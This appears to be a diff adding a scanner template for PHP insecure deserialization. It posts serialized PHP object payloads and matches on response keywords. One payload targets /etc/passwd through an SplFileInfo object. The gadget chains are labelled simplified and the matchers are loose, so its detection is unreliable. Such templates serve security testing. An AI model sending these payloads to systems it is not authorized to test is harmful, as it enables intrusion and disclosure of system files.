@@ -1,0 +1,37 @@
+# templates/deserialization/php-deserialization.yaml
+id: php-deserialization
+info:
+  name: PHP Insecure Deserialization
+  author: shadowxp
+  severity: critical
+  description: Tests for PHP insecure deserialization vulnerabilities
+  tags:
+    - deserialization
+    - php
+    - rce
+
+vulnerability_type: deserialization
+
+request:
+  - method: POST
+    path: "{{BaseURL}}"
+    body: "data={{php_payload}}"
+    
+    matchers:
+      - type: word
+        words:
+          - "O:"
+          - "object"
+          - "class"
+        part: body
+
+payloads:
+  # Basic PHP object
+  - 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
+  # PHP gadget chains (simplified)
+  - 'O:12:"PDOStatement":0:{}'
+  - 'O:10:"SplFileInfo":1:{s:8:"pathname";s:10:"/etc/passwd";}'
+
+encoders:
+  - url
+  - base64
